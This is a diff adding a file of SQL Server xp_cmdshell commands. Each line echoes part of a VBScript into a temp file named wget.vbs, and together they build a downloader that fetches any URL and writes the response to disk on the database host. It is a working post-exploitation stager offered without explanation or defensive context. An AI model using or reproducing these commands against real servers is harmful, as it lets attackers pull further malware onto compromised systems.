@@ -1,0 +1,25 @@
+xp_cmdshell echo strUrl = WScript.Arguments.Item(0) > %TMP%\wget.vbs
+xp_cmdshell echo StrFile = WScript.Arguments.Item(1) >> %TMP%\wget.vbs
+xp_cmdshell echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> %TMP%\wget.vbs
+xp_cmdshell echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> %TMP%\wget.vbs
+xp_cmdshell echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> %TMP%\wget.vbs
+xp_cmdshell echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> %TMP%\wget.vbs
+xp_cmdshell echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> %TMP%\wget.vbs
+xp_cmdshell echo Err.Clear >> %TMP%\wget.vbs
+xp_cmdshell echo Set http = Nothing >> %TMP%\wget.vbs
+xp_cmdshell echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> %TMP%\wget.vbs
+xp_cmdshell echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> %TMP%\wget.vbs 
+xp_cmdshell echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> %TMP%\wget.vbs 
+xp_cmdshell echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> %TMP%\wget.vbs
+xp_cmdshell echo http.Open "GET", strURL, False >> %TMP%\wget.vbs
+xp_cmdshell echo http.Send >> %TMP%\wget.vbs
+xp_cmdshell echo varByteArray = http.ResponseBody >> %TMP%\wget.vbs
+xp_cmdshell echo Set http = Nothing >> %TMP%\wget.vbs
+xp_cmdshell echo Set fs = CreateObject("Scripting.FileSystemObject") >> %TMP%\wget.vbs
+xp_cmdshell echo Set ts = fs.CreateTextFile(StrFile, True) >> %TMP%\wget.vbs
+xp_cmdshell echo strData = "" >> %TMP%\wget.vbs
+xp_cmdshell echo strBuffer = "" >> %TMP%\wget.vbs
+xp_cmdshell echo For lngCounter = 0 to UBound(varByteArray) >> %TMP%\wget.vbs
+xp_cmdshell echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> %TMP%\wget.vbs
+xp_cmdshell echo Next >> %TMP%\wget.vbs
+xp_cmdshell echo ts.Close >> %TMP%\wget.vbs
